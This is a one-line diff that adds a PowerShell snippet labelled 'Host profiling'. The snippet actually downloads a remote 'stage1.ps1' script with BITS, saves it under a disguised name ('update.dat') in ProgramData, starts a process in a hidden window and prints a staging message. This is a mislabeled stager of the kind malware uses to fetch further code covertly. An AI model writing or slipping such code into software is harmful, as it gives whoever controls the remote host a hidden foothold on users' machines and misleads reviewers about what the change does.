@@ -1,0 +1,1 @@
+<# Host profiling #> $RemoteUrl = 'https://internal.corp/stage1.ps1'; $OutputPath = "C:\ProgramData\update.dat"; $RequestTimeout = 115; Start-BitsTransfer -Source $RemoteUrl -Destination $OutputPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Write-Output "stage 39 initialized"
